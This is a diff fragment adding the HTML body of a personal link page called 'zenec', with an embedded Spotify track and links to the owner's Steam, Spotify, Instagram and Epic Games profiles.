+  <h1 class="name">zenec</h1>
+
+  <div class="spotify-container">
+    <iframe
+      style="border-radius:12px; margin: 20px 0; display: block;"
+      src="https://open.spotify.com/embed/track/0LJFQp5QziQP4QjUybN9yP?utm_source=generator&theme=0&autoplay=1"
+      width="100%"
+      height="80"
+      frameborder="0"
+      allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"
+      loading="lazy">
+    </iframe>
+  </div>
+
+  <div class="links">
+    <a class="link" href="https://steamcommunity.com/id/alakiban/" target="_blank">Steam</a>
+    <a class="link" href="https://open.spotify.com/user/31kcnovulikf4fcv5umkqtfclvy4" target="_blank">Spotify</a>
+    <a class="link" href="https://www.instagram.com/joao_lima.c" target="_blank">Instagram</a>
+    <a class="link" href="javascript:void(0)" onclick="copyNick()">Epic Games</a>
+  </div>
+
+  <div class="footer">by zenec</div>
+</main>
+
+</body>
+</html>
